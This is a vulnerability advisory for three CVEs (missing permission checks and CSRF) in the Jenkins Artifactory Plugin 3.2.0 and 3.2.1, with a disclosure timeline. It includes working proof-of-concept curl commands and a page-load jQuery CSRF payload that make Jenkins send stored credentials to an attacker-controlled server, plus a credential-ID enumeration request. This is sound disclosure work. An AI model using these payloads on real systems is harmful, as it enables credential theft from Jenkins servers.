## Jenkins Artifactory Plugin - Information disclosure vulnerabilities

##### Discovered by:
* Peter Adkins <peter.adkins@kernelpicnic.net>

##### Access:
* Local network; authenticated access
* Remote network; authenticated access (See notes)
* Remote network; 'drive-by' via CSRF

##### Tracking and identifiers:
* CVE - CVE-2019-10321
* CVE - CVE-2019-10322
* CVE - CVE-2019-10323

##### Versions Affected:
* Jenkins Artifactory Plugin 3.2.1
* Jenkins Artifactory Plugin 3.2.0

##### Vendor involvement:
* 2019-03-12 - Vendor Disclosure
* 2019-05-28 - Vendor Patched
* 2019-06-04 - Public Release

##### Notes:
1. This may be exploited by an anonymous user if unauthenticated access is enabled in Jenkins.

1. Due to lack of validation of Cross Site Request Forgery (CSRF) token validation, this vulnerability may also be exploited via CSRF.

1. Originally published under [TALOS-2019-0787](https://talosintelligence.com/vulnerability_reports/TALOS-2019-0787) and [TALOS-2019-0846](https://talosintelligence.com/vulnerability_reports/TALOS-2019-0846). Mirrored here here for tracking purposes.

##### Overview:
An exploitable information disclosure vulnerability exists in the `testConnection` endpoint of the Jenkins Artifactory Plugin 3.2.0 and 3.2.1. As a result of this vulnerability a crafted HTTP request from a user with Overall/Read permissions - such as an anonymous user, if enabled - can cause affected versions of this plugin to disclose credentials from the Jenkins credentials database to an attacker controlled server.

In addition to the above, the plugin is also vulnerable to low-level information disclosure via the `fillCredentialsIdItems` endpoint. As a result of this vulnerability a crafted HTTP request from a user with Overall/Read permissions - such as an anonymous user, if enabled - can cause affected versions of this plugin to disclose credential identifiers from the Jenkins credentials database. These credential identifiers may then be used to capture credentials using the vulnerable `testConnection` endpoint.

##### Analysis:
**CVE-2019-10322 - `doTestConnection` missing permission check**

This vulnerability exists in the testConnection endpoint exposed by the `doTestConnection` method of `org.jfrog.hudson.ArtifactoryBuilder` due to missing Jenkins permissions check. To exploit this vulnerability an attacker must know the credential identifier of the credential to leak. This said, this information can be obtained via a number of means, such as additional information disclosure vulnerabilities in this, and other, Jenkins plugins (see below).

Due to the way in which this plugin expects to authenticate against the remote Artifactory instance, the credentials associated with the attacker specified credentialsId are base64-encoded and submitted as part of the HTTP Authorization header to the attacker-controlled server. An example of this attack against a Jenkins 2.165 instance running a vulnerable version of this plugin and configured to allow anonymous read access has been provided below.

```
# Send credentials to an attacker's server (http://192.0.2.1:7000?).
# The trailing '?' is to ensure that the expected path is appended as a
# query parameter, rather than part of the query path.
$ curl -s -X GET -G \
    -d 'artifactoryUrl=http://192.0.2.1:7000/?' \
    -d 'connectionRetry=0' \
    -d 'useCredentialsPlugin=true' \
    -d 'credentialsId=287fcbe2-177e-4108-ac58-efdc0a507376' \
    'http://jenkins.docker.local:8080/descriptorByName/org.jfrog.hudson.ArtifactoryBuilder/testConnection'
```

The request submitted by the plugin to the remote server as an HTTP GET, will appear similar to the following:

```
# First request from Jenkins (GET)
/?/api/system/version
Host: 192.0.2.1:7000
Connection: Keep-Alive
User-Agent: ArtifactoryBuildClient/2.13.3
Accept-Encoding: gzip,deflate
Authorization: Basic U2VjdXJlVXNlcm5hbWU6U2VjdXJlUGFzc3dvcmRPaE5v
```

It is worth noting that as the response from the attacker-controlled server is not in the expected format, the plugin will raise an error but not render the response.

**CVE-2019-10321 - `doTestConnection` CSRF**

This vulnerability exists in the `testConnection` endpoint exposed by the doTestConnection method of `org.jfrog.hudson.ArtifactoryBuilder` due to missing CSRF validation.

The payload below could be embedded in a webpage and will successfully execute a request against the target Jenkins instance on page load. Due to lack of CSRF validation in the plugin, and lack of additional mitigations such as `SameSite` Cookie attribute, this JSONP (JSON with padding) request will utilize any currently authenticated Jenkins sessions for the configured target. This payload has been confirmed working in Safari 12.1.1 (14607.2.6.1.1) and Google Chrome 74.0.3729.169.

It's worth noting that despite the use of JSONP, the response content is not accessible due to a MIME type mismatch (`application/json` versus `application/javascript`) and explicit `X-Content-Type: nosniff` header being returned by Jenkins. This said, the request will still execute as expected, performing an onward request to the attacker's server (specified by the `artifactoryUrl` parameter) containing the credentials associated with the specified credentialsId.

```
<!-- Perform request in the background. This proof-of-concept requires jQuery. -->
<script>
  $(document).ready(function() {
    target = 'http://jenkins.docker.local:8080'
    $.ajax({
        url: target + "/descriptorByName/org.jfrog.hudson.ArtifactoryBuilder/testConnection",
        jsonp: "jsonp",
        dataType: "jsonp",
        data: {
            artifactoryUrl: "http://192.0.2.1:7000/?",
            connectionRetry: "0",
            useCredentialsPlugin: "true",
            credentialsId: "287fcbe2-177e-4108-ac58-efdc0a507376",
            pretty: true,
        },
        success: function(data) {}
    });
  });
</script>
```

The request submitted by the plugin to the remote server as an HTTP GET, will appear similar to the following:

```
# First request from Jenkins (GET)
/?/api/system/version
Host: 192.0.2.1:7000
Connection: Keep-Alive
User-Agent: ArtifactoryBuildClient/2.13.3
Accept-Encoding: gzip,deflate
Authorization: Basic U2VjdXJlVXNlcm5hbWU6U2VjdXJlUGFzc3dvcmRPaE5v
```

**CVE-2019-10323 - `fillCredentialsIdItems` low-level information disclosure**

This vulnerability exists in the `fillCredentialsIdItems` endpoint exposed by the `doFillCredentialsIdItems` method of `org.jfrog.hudson.ArtifactoryBuilder` due to missing Jenkins permissions check. The result of this vulnerability is low level information disclosure. This information may be useful for an attacker as it may be used in conjunction with additional vulnerabilities in this, or other, Jenkins plugins (see above).

```
# List username / password credentials on target Jenkins instance.
$ curl -s -X GET -G \
    -d 'pretty=true' \
    'http://jenkins.docker.local:8080/descriptorByName/org.jfrog.hudson.ArtifactoryBuilder/fillCredentialsIdItems'
{
    "_class": "com.cloudbees.plugins.credentials.common.StandardListBoxModel",
    "values": [
        {
            "name": "- none -",
            "selected": false,
            "value": ""
        },
        {
            "name": "BBBBBB/****** (ExampleOnly)",
            "selected": false,
            "value": "01e367ef-54fb-4da0-8044-5112935037bb"
        },
        {
            "name": "SecureUsername/****** (Credentials for X)",
            "selected": false,
            "value": "287fcbe2-177e-4108-ac58-efdc0a507376"
        }
    ]
}
```
